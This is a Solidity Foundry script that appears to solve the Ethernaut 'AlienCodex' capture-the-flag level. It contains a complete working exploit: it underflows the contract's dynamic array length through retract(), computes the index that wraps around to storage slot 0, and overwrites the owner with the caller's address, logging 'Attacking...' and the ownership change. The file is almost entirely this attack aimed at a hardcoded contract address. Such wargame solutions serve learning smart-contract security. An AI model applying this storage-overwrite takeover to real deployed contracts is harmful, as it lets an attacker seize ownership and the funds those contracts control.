// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface AlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint, bytes32) external;

    function owner() external view returns (address);
}

contract AlienCodexScript is Script {
    AlienCodex public instance = AlienCodex(payable(0x1Ccb5f5d53cdcd4E593FBCA2e00F7AB338b546Ad));

    function run() external {
	vm.startBroadcast();
	console.log("AlienCodex Contract initial owner:", instance.owner());
	console.log("Contacting...");
	instance.makeContact();
	console.log("Retracting...");
	instance.retract();
	console.log("Attacking...");
	uint256 bytes32ArraySlot = 1;
	uint256 codexStorageSlot = uint256(keccak256(abi.encode(bytes32ArraySlot)));
	instance.revise(type(uint256).max - codexStorageSlot + 1, bytes32(uint256(uint160(msg.sender))));
	console.log("AlienCodex Contract owner:", instance.owner());
	vm.stopBroadcast();
    }
}
